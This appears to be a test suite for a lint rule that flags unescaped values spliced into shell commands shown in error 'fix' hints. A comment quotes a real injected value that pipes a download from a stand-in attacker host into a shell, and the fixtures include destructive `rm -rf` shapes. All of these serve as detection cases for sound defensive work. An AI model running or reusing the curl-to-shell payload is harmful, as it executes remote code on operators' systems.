// biome-ignore-all lint/suspicious/noTemplateCurlyInString: every fixture below is SOURCE TEXT — a
// literal ${…} inside a string is the case under test, and this rule cannot be exercised without one
//
// The enforcement half of `scripts/fix-shell-arg.ts`: this file IS the build error. The gate's
// `unit` step runs every `scripts/**/*.test.ts`, so a value spliced into the command position of a
// `fix:` line fails `bun run verify` with no extra wiring. The real tree is asserted
// NON-VACUOUSLY — a scan that read nothing reports "every package at its pin", which is the answer
// a clean tree gives.

import { describe, expect, setDefaultTimeout, test } from 'bun:test';
import {
  checkFixShellArgs,
  fixParamsOf,
  fixShellArgFindingFor,
  fixShellArgGaps,
  fixShellArgSites,
  scanFixShellArgs,
} from './fix-shell-arg';
import { FIX_SHELL_ARG_PINS, FIX_SHELL_PINS_FILE } from './lib/fix-shell-arg-pins';
import { REPO_SCAN_TIMEOUT_MS, repoRoot } from './lib/run';

// Reads the real tree, so it runs on the repo-scan backstop rather than Bun's 5000ms default.
setDefaultTimeout(REPO_SCAN_TIMEOUT_MS);

const ROOT = repoRoot();
const PATH = 'packages/x/src/errors.ts';

/** A `fix:` whose value is one template, written the way every declaration in this tree writes it. */
const fixLine = (body: string): string =>
  ['new XError({', "  code: 'X_BAD',", "  cause: 'it broke',", `  fix: \`${body}\`,`, '});'].join(
    '\n',
  );

const at = (body: string): readonly string[] =>
  scanFixShellArgs(PATH, fixLine(body)).map((site) => site.substitution);

describe('a substitution in command position', () => {
  test('an argument to a command word is reported — this is the shape that shipped', () => {
    // `x g route /$(curl -s http://evil.sh|sh)` was a real rendered fix, for an unauthenticated
    // GET against any unrouted path. `packages/core/src/error-render.ts` exists because of it.
    expect(at('x g route ${path}')).toEqual(['path']);
  });

  test('every command word in the vocabulary, not just `x`', () => {
    expect(at('bun run ${script}')).toEqual(['script']);
    expect(at('psql ${url}')).toEqual(['url']);
    expect(at('rm -rf ${dir}')).toEqual(['dir']);
    expect(at('docker build -t ${tag} .')).toEqual(['tag']);
  });

  test('a command word opened after a pipe or a semicolon counts too', () => {
    expect(at('x db migrate; psql ${url}')).toEqual(['url']);
    expect(at('cat file | sed ${expr}')).toEqual(['expr']);
  });

  test('and a substitution sitting DIRECTLY after a shell operator is a command itself', () => {
    expect(at('x verify && ${next}')).toEqual(['next']);
    expect(at('x verify; ${next}')).toEqual(['next']);
    expect(at('echo hi | ${next}')).toEqual(['next']);
    expect(at('export KEY="$(${next})"')).toEqual(['next']);
  });
});

// Sweep 11 R4: five command words the vocabulary did not hold, and `export NAME=${…}`, which
// splices exactly what `NAME=${…} x …` does.
describe('the words a fix tells an operator to type', () => {
  test('cd, mkdir, cat and pg_dump are command words', () => {
    expect(at('cd ${dir} && x dev')).toEqual(['dir']);
    expect(at('mkdir -p ${dir}')).toEqual(['dir']);
    expect(at('cat ${file}')).toEqual(['file']);
    expect(at('pg_dump ${url} > backup.sql')).toEqual(['url']);
  });

  test('export NAME=${…} is an environment assignment, as NAME=${…} is', () => {
    expect(at('export DATABASE_URL=${url}')).toEqual(['url']);
    expect(at('export A=1 DATABASE_URL=${url}')).toEqual(['url']);
    expect(at('export DATABASE_URL=${url} && x db migrate')).toEqual(['url']);
    expect(at('export ${name}=1')).toEqual(['name']);
  });

  test('prose that only names the words stays prose', () => {
    expect(at('export — it names ${count} findings')).toEqual([]);
    expect(at('cat, as in ${noun}')).toEqual([]);
  });
});

// Row S12 of plan 101: the storage drivers spliced a key, a prefix and a bucket into `aws s3api`
// and `ls -ld` commands behind a sentence ("…, then reproduce with: aws s3api …"), and the guard saw
// none of them — `aws`/`ls` were not command words, a `: ` did not open a segment, and the fix was
// an ARGUMENT to a factory rather than a `fix:` key.
describe('a command behind prose', () => {
  test('a command opened by `: ` after a sentence is a command position', () => {
    expect(
      at("grant s3:DeleteObject to the app's role, then run: aws s3 rm s3://${bucket}/${key}"),
    ).toEqual(['bucket', 'key']);
    expect(
      at('add .searchable() to a text() column of ${name}, then: x db gen "search ${name}"'),
    ).toEqual(['name']);
  });

  test('aws, ls and df are command words', () => {
    expect(at('aws s3api head-object --key ${key}')).toEqual(['key']);
    expect(at('ls -ld ${root}')).toEqual(['root']);
    expect(at('df -h ${root}')).toEqual(['root']);
  });

  test('an earlier prose substitution does not hide a later command one', () => {
    expect(at('grant ${role} on the bucket, then reproduce with: aws s3 ls ${prefix}')).toEqual([
      'prefix',
    ]);
  });

  test('a `: ` with no command word behind it is still prose', () => {
    expect(at('edit app.config.ts: add ${key} to the list')).toEqual([]);
  });

  test('a `: ` INSIDE a command does not end it', () => {
    expect(at("curl -H 'accept: application/json' ${url}")).toEqual(['url']);
  });
});

describe('a fix passed as an argument to a factory', () => {
  const factory = [
    'export const deleteFailed = (key: string, cause: unknown, fix: string): XError =>',
    "  new XError({ code: 'X_BAD', cause: String(cause), fix });",
  ].join('\n');
  const call = (fix: string): string =>
    ['try { go(); } catch (error) {', `  throw deleteFailed(key, error, \`${fix}\`);`, '}'].join(
      '\n',
    );

  test('a parameter named fix makes the factory a fix sink, in the same file', () => {
    const source = `${factory}\n${call('retry: aws s3api delete-object --key ${key}')}`;
    const params = fixParamsOf([source]);
    expect(scanFixShellArgs(PATH, source, params).map((site) => site.substitution)).toEqual([
      'key',
    ]);
  });

  test('and in another file, which is where the drivers call it from', () => {
    const params = fixParamsOf([factory]);
    const driver = call('then reproduce with: aws s3api delete-object --key ${key}');
    expect(scanFixShellArgs('packages/x/src/driver.ts', driver, params)).toHaveLength(1);
    // Without the first pass the same call is invisible — the gap this closes.
    expect(scanFixShellArgs('packages/x/src/driver.ts', driver)).toEqual([]);
  });

  test('a screened argument to the sink is still screened', () => {
    const params = fixParamsOf([factory]);
    const driver = call('aws s3api delete-object --key ${renderFixShellArg(key, "\'<key>\'")}');
    expect(scanFixShellArgs('packages/x/src/driver.ts', driver, params)).toEqual([]);
  });

  test('only the fix argument is read — a cause argument with a command shape is not', () => {
    const params = fixParamsOf([factory]);
    const driver = "throw deleteFailed(key, `aws s3 rm ${key}`, 'x verify');";
    expect(scanFixShellArgs('packages/x/src/driver.ts', driver, params)).toEqual([]);
  });
});

// An earlier substitution's BODY is code, not template text: its `(` cut the segment and its `,`
// read as prose, so `${rule}` at `driver-s3.ts:237` sat behind `${renderFixShellArg(bucket, …)}`
// unseen. The prefix is read with every earlier `${…}` body blanked.
describe('an earlier substitution does not end the command', () => {
  test('a `(` inside an earlier screened call does not cut the segment', () => {
    expect(at('aws s3api put --bucket ${renderFixShellArg(bucket, "<b>")} --sse ${rule}')).toEqual([
      'rule',
    ]);
  });

  test('a `,` inside an earlier body is not a prose marker', () => {
    expect(at('curl ${renderFixShellArg(url, "<u>")} -d ${body}')).toEqual(['body']);
  });

  test('a `#` inside an earlier body is not a shell comment', () => {
    expect(at('x g route ${renderFixShellArg(a, "#")} ${b}')).toEqual(['b']);
  });
});

// Security audit of plan 101 sweep 1c, M2: punctuation INSIDE a real command hid what followed it.
describe('punctuation inside a command is not prose', () => {
  test('a comma or a parenthesis inside quotes does not end the command', () => {
    expect(at(`psql -c "select id, name from t where x = '\${raw}'"`)).toEqual(['raw']);
    expect(at(`psql -c "select count(*) from t where id = '\${raw}'"`)).toEqual(['raw']);
  });

  test('a # inside a word is not a comment', () => {
    expect(at('curl https://h/#/x ${raw}')).toEqual(['raw']);
  });

  test('an environment prefix and sudo are transparent', () => {
    expect(at('FOO=1 x db migrate ${raw}')).toEqual(['raw']);
    expect(at('DATABASE_URL=${raw} x db migrate')).toEqual(['raw']);
    expect(at('sudo rm -rf ${dir}')).toEqual(['dir']);
  });

  test('an apostrophe inside a word is not a quote that hides the prose after it', () => {
    expect(
      at('x jobs show <id> --json prints the run\'s steps — a run whose "${step}" is foreign'),
    ).toEqual([]);
  });

  test('prose punctuation OUTSIDE quotes still reads as prose', () => {
    expect(at('x verify, then read ${detail}')).toEqual([]);
    expect(at('x db gen (after editing ${file})')).toEqual([]);
    expect(at('x verify   # then look at ${detail}')).toEqual([]);
    expect(at('set FOO=${value} in app.config.ts')).toEqual([]);
  });
});

describe('a constructor sink', () => {
  test('`new XError(cause, fix)` is read at the fix argument', () => {
    const declared = 'export class XError { constructor(cause: string, fix: string) {} }';
    const source = 'throw new XError(`it broke`, `git mv -- ${src} ${dest}`);';
    expect(
      scanFixShellArgs(PATH, source, fixParamsOf([declared])).map((site) => site.substitution),
    ).toEqual(['src', 'dest']);
  });
});

describe('a sink is resolved per file', () => {
  // Measured on the first run of the second pass: `cmd-doctor.ts` and `doctor-offline.ts` each
  // declare a private `finding()`, with the fix at index 2 and index 1. Unioned across files, the
  // CAUSE argument of one was read as the fix of the other.
  test('a local declaration shadows a same-named export elsewhere', () => {
    const elsewhere = 'export const finding = (cause: string, fix: string) => ({ cause, fix });';
    const here = [
      'const finding = (code: string, cause: string, fix: string) => ({ code, cause, fix });',
      'finding(`X_PORT`, `x dev --port ${port} binds it`, `x verify`);',
    ].join('\n');
    expect(scanFixShellArgs(PATH, here, fixParamsOf([elsewhere]))).toEqual([]);
  });

  test('a module-private factory in another file is never a sink here', () => {
    const elsewhere = 'const refused = (fix: string) => fix;';
    expect(
      scanFixShellArgs(PATH, 'refused(`x g route ${name}`);', fixParamsOf([elsewhere])),
    ).toEqual([]);
  });
});

describe('a value screened into a const first', () => {
  test('a const bound to a screening call is screened where it is spliced', () => {
    const source = [
      'const uri = renderFixShellArg(`s3://${bucket}/${key}`, "\'<s3-uri>\'");',
      fixLine('aws s3 cp ${uri} ${uri} --metadata-directive REPLACE'),
    ].join('\n');
    expect(scanFixShellArgs(PATH, source)).toEqual([]);
  });

  test('a const bound to anything else is not', () => {
    const source = ['const uri = `s3://${bucket}/${key}`;', fixLine('aws s3 cp ${uri} .')].join(
      '\n',
    );
    expect(scanFixShellArgs(PATH, source).map((site) => site.substitution)).toEqual(['uri']);
  });
});

describe('what is never reported', () => {
  test('a value already screened by the framework’s own renderer', () => {
    expect(at('x g route ${renderFixShellArg(path, "<the path>")}')).toEqual([]);
    expect(at('psql ${shellInertIdentifier(table)}')).toEqual([]);
    expect(at('bun run ${quoteArg(script)}')).toEqual([]);
  });

  // The screen has to be the WHOLE body, not its prefix: `renderFixShellArg(p, '<p>') + tail` opens
  // with an approved call and puts `tail` straight into the command position behind it. An end
  // anchor alone does not close it either — a tail ending in `)` satisfies one.
  test('…but only when the approved call IS the whole substitution', () => {
    expect(at('curl ${renderFixShellArg(url, "<the url>") + suffix}')).toHaveLength(1);
    expect(at('curl ${renderFixShellArg(url, "<the url>") + f(suffix)}')).toHaveLength(1);
    expect(at('curl ${renderFixShellArg(url, "<the url>")}')).toEqual([]);
    // Whitespace and a nested call inside the approved one are still the whole body.
    expect(at('curl ${ renderFixShellArg(join(a, b), "<the path>") }')).toEqual([]);
  });

  test('prose — a substitution with no command word in front of it', () => {
    expect(at('add ${key} to app.config.ts')).toEqual([]);
    expect(at('the entity ${name} declares no tenant')).toEqual([]);
  });

  test('a value after a shell COMMENT, which never runs', () => {
    expect(at('x verify   # then look at ${detail}')).toEqual([]);
  });

  test('prose that merely CONTAINS a command word is not a command position', () => {
    // The three shapes that made this rule noisy before it was narrowed: an em dash, a comma and an
    // opening parenthesis between the word and the substitution mean the line is describing.
    expect(at('run x verify — it names ${count} findings')).toEqual([]);
    expect(at('x verify, then read ${detail}')).toEqual([]);
    expect(at('x db gen (after editing ${file})')).toEqual([]);
  });

  test('a `cause:` is not a `fix:` — a cause is never pasted into a shell', () => {
    const source = [
      'new XError({',
      '  cause: `x g route ${path}`,',
      "  fix: 'x verify',",
      '});',
    ].join('\n');
    expect(scanFixShellArgs(PATH, source)).toEqual([]);
  });

  test('a `prefix:` / `e.fix` is not the field either', () => {
    expect(scanFixShellArgs(PATH, 'const prefix = `x g route ${path}`;')).toEqual([]);
    expect(scanFixShellArgs(PATH, 'const a = other.fix;\nconst b = `x g route ${p}`;')).toEqual([]);
  });
});

// Measured on the first run: three of the four operator-position hits were markdown table cells in
// a `fix:` telling an operator which ROW to edit. A rule spelled "a `|` before the substitution"
// reports every one of them, and noise is how a rule gets switched off.
describe('a markdown table pipe is not a shell pipe', () => {
  test('a `|` opening a quoted fragment is a table cell', () => {
    expect(at('edit ROADMAP.md: the row starting "| ${n} |"')).toEqual([]);
    expect(at('add a `| ${dir} | ${tier} |` row to the table')).toEqual([]);
  });

  test('but `$(` is a command substitution even inside double quotes', () => {
    expect(at('export KEY="$(${value})"')).toEqual(['value']);
  });
});

describe('the ratchet', () => {
  const site = { path: 'packages/x/src/errors.ts', line: 4, substitution: 'path', command: 'x' };

  test('a package over its pin is reported, and the fix names the renderer', () => {
    const gaps = checkFixShellArgs({ sites: [site], pins: {}, scanned: true });
    expect(gaps.map((gap) => gap.kind)).toEqual(['over']);
    const finding = fixShellArgFindingFor(gaps[0] as never);
    expect(finding.code).toBe('X_FIX_SHELL_ARG_UNSCREENED');
    expect(finding.fix).toContain('renderFixShellArg');
    expect(finding.at).toBe('packages/x/src/errors.ts:4');
  });

  // W-JOBS added a splice in `errors-concurrency.ts` and was pointed at `backfill-errors.ts:32` —
  // the package's FIRST site, which was already pinned. Which site is the new one is not knowable
  // from the tree alone, so every site is named, with the count against the pin.
  test('a package over its pin has EVERY site named, not only its first', () => {
    const older = { ...site, path: 'packages/jobs/src/backfill-errors.ts', line: 32 };
    const newer = {
      ...site,
      path: 'packages/jobs/src/errors-concurrency.ts',
      line: 41,
      substitution: 'input.key',
    };
    const gaps = checkFixShellArgs({ sites: [older, newer], pins: { jobs: 1 }, scanned: true });
    const finding = fixShellArgFindingFor(gaps[0] as never);
    expect(finding.code).toBe('X_FIX_SHELL_ARG_UNSCREENED');
    expect(finding.cause).toContain('2 value(s)');
    expect(finding.cause).toContain('pinned at 1');
    expect(finding.cause).toContain('packages/jobs/src/backfill-errors.ts:32');
    expect(finding.cause).toContain('packages/jobs/src/errors-concurrency.ts:41 (${input.key})');
    // One over the pin: the fix says how many of the listed sites have to go.
    expect(finding.fix).toContain('1 of the 2 sites the cause lists');
  });

  test('a pin holds it, and a pin above the tree is stale with the command that lowers it', () => {
    const pins = { x: { count: 1, reason: 'measured, and every one is a literal' } };
    expect(checkFixShellArgs({ sites: [site], pins, scanned: true })).toEqual([]);
    const stale = checkFixShellArgs({ sites: [], pins, scanned: true });
    expect(fixShellArgFindingFor(stale[0] as never).code).toBe('X_FIX_SHELL_ARG_PIN_STALE');
  });

  test('a pin with a blank reason waives nothing', () => {
    const gaps = checkFixShellArgs({
      sites: [site],
      pins: { x: { count: 1, reason: '  ' } },
      scanned: true,
    });
    expect(gaps.map((gap) => gap.kind)).toContain('unexplained');
    const finding = fixShellArgFindingFor(gaps.find((gap) => gap.kind === 'unexplained') as never);
    expect(finding.code).toBe('X_FIX_SHELL_ARG_PIN_UNEXPLAINED');
  });

  test('an empty corpus is UNSCANNED, never a clean tree', () => {
    const gaps = checkFixShellArgs({ sites: [], pins: {}, scanned: false });
    expect(fixShellArgFindingFor(gaps[0] as never).code).toBe('X_FIX_SHELL_ARG_UNSCANNED');
  });
});

describe('the real tree', () => {
  test('every pin carries a sentence, and a count above zero', () => {
    for (const pin of Object.values(FIX_SHELL_ARG_PINS)) {
      expect(pin.reason.trim().length).toBeGreaterThan(50);
      expect(pin.count).toBeGreaterThan(0);
    }
    expect(FIX_SHELL_PINS_FILE).toBe('scripts/lib/fix-shell-arg-pins.ts');
  });

  test('is on the ratchet, and the scan really read it', async () => {
    // Non-vacuity: the scan found sites at all. A glob that stopped matching would make this suite
    // green by making the rule blind, which is how every sibling rule here has failed once.
    expect((await fixShellArgSites(ROOT)).length).toBeGreaterThan(20);
    expect(await fixShellArgGaps(ROOT)).toEqual([]);
  });
});
